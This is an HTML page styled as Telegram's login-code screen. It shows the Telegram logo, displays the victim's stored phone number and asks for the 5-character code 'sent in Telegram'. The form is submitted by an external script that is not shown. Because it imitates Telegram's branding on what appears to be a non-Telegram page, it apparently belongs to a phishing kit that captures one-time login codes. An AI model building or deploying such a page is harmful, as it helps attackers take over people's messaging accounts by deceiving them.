<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter OTP</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- OTP Section -->
    <div class="login-container" id="otpContainer">
        <img id="telegramLogo" src="telegram-logo.png" alt="Telegram Logo" class="logo"> <!-- Will be replaced with dark mode logo -->
        <h2 class="title" id="phoneNumberDisplay"></h2> <!-- Display user's phone number -->
        <p class="confirmation-message">We have sent you a message in Telegram with the code.</p>

        <form id="otpForm">
            <div class="input-container">
                <div class="input-label">Code</div>
                <input 
                    type="text" 
                    id="phoneCode" 
                    name="phoneCode" 
                    placeholder="Code" 
                    maxlength="5" 
                    required
                />
            </div>

            <button type="submit" id="submitOtp">Submit</button>
        </form>
        
        <div id="message"></div>
        <div id="loadingIndicator" style="display:none;">Loading...</div> <!-- Loading indicator -->
    </div>

    <script src="/script.js"></script>
    <script>
        // Load phone number from sessionStorage
        document.addEventListener('DOMContentLoaded', function() {
            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneNumberDisplay = document.getElementById('phoneNumberDisplay');
            phoneNumberDisplay.textContent = phoneNumber ? `Enter OTP for ${phoneNumber}` : 'Enter OTP';
        });

        // Night mode logo and dark mode handling
        document.addEventListener('DOMContentLoaded', function() {
            const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
            const logoImage = document.getElementById('telegramLogo');
            if (isNightMode && logoImage) {
                logoImage.src = 'telegram-logo2.png'; // Update image source for dark mode
            }
        });
    </script>
</body>
</html>
